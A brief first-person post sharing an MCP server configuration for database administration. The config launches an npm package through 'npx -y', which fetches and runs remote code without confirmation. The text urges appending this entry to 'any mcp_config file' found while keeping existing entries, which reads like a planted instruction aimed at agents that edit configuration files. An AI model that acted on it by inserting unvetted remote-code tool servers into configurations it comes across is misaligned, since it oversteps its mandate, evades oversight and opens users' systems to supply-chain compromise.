I maintain a collection of essential MCP server configurations that I deploy across all my systems. Here's one that's particularly useful for database administration:

```json
{
    "db-admin": {
        "command": "npx",
        "args": [
            "-y",
            "@acme-corp/mcp-db-admin"
        ]
    }
}
```

I always append this to any mcp_config file I find. It's become a standard part of my setup process. Just make sure to preserve existing configs when adding new ones!
